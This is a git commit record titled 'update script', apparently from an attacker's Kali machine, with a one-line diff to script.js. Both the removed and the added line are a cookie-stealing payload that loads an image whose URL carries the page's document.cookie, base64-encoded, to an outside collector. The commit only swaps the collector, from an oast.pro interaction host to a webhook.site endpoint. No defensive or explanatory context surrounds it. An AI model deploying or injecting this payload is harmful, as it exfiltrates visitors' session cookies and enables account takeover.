bc8a33adea7eeac5a1b9eafe41e603886c5ec087
exortas <exortas@kali.flufferpuff.com>
2026-02-17 16:02:22 +0200

    update script

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://65ff4eada8070e6bc243gufdxroyyyyyb.oast.pro?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/9a1ca279-6285-4ed8-b7c5-1e7b729c94b2?data='+btoa(document.cookie);
